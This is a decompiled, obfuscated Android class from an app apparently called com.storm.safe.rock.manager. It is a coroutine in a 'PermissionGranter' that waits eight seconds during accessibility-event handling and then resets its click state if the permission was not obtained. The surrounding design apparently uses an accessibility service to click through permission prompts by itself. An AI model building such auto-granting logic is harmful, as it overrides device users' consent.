package com.storm.safe.rock.manager;

import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.PermissionGranter$handleAccessibilityEventInternal$1", m214403f = "PermissionGranter.kt", m214404l = {835}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class PermissionGranter$handleAccessibilityEventInternal$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52016a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0260a2 f52017a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public PermissionGranter$handleAccessibilityEventInternal$1(C0260a2 c0260a2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52017a2 = c0260a2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new PermissionGranter$handleAccessibilityEventInternal$1(this.f52017a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((PermissionGranter$handleAccessibilityEventInternal$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52016a1;
        if (i == 0) {
            kg1.m213544f4(obj);
            this.f52016a1 = 1;
            if (b81.m210571b1(8000L, this) == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
        }
        C0260a2 c0260a2 = this.f52017a2;
        if (c0260a2.f52110a2 && !C0260a2.m211293f1()) {
            t60.m214726f4("PermissionGranter", "⚠️ [权限] 安全重置-8秒后权限仍未获取，重置状态避免乱点击");
            c0260a2.f52110a2 = false;
            c0260a2.f52114a6 = 0;
        }
        return C1351vv.f60710b1;
    }
}
